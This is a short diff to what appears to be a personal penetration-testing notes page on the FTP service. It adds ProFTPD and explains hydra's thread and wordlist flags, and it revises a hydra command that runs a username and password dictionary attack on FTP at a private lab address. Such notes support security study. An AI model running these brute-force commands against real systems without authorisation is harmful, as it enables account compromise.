@@ -22,14 +22,20 @@ file sharing protocol used by different services
 ## Related Services
 vsftp
 SFTP
+ProFTPD
 
 # #Tools
 ## #hydra
 [hydra](../Tools/Hydra.md)
 dictionary attack with *userlist* and *passlist*
+- -t : threads
+- -L : user File
+- -P : pass File
 ```bash
-hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.24.3 ftp
+hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.24.3 -t 4 ftp
 ```
+
+
 
 ## #nmap
 [nmap](../Tools/NMAP.md)
